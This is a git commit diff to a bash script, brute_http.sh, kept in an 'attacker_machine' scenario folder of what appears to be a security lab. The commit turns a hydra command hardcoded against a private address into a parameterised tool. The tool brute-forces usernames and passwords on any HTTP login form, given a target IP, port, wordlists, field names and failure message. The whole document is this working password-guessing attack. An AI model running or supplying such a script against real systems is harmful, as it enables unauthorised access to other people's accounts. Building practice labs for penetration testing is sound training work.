4ea432e2a6dd800b237264df601244db3c17458e
C4denaX <48528606+C4denaX@users.noreply.github.com>
2024-09-17 09:32:37 +0200

    Update brute_http.sh

--- attacker_machine/escenario_scripts/brute_http.sh
+++ attacker_machine/escenario_scripts/brute_http.sh
@@ -1,3 +1,17 @@
 #!/bin/bash
 
-hydra -L /usr/share/wordlists/nmap.lst -P /usr/share/wordlists/nmap.lst 10.0.0.1 -s 8888 http-post-form "/:uname=^USER^&psw=^PASS^&Login=Login:Login failed"
+IP="$1"
+PORT="$2"
+USERNAME_LIST="$3"
+PASSWORD_LIST="$4"
+FORM_PATH="$5"
+USERNAME_PARAM="$6"
+PASSWORD_PARAM="$7"
+FAILURE_MESSAGE="$8"
+
+if [ $# -ne 8 ]; then
+    echo "Usage: $0 <IP> <PORT> <username_list> <password_list> <form_path> <username_param> <password_param> <failure_message>"
+    exit 1
+fi
+
+hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" "$IP" -s "$PORT" http-post-form "$FORM_PATH:$USERNAME_PARAM=^USER^&$PASSWORD_PARAM=^PASS^&Login=Login:$FAILURE_MESSAGE"
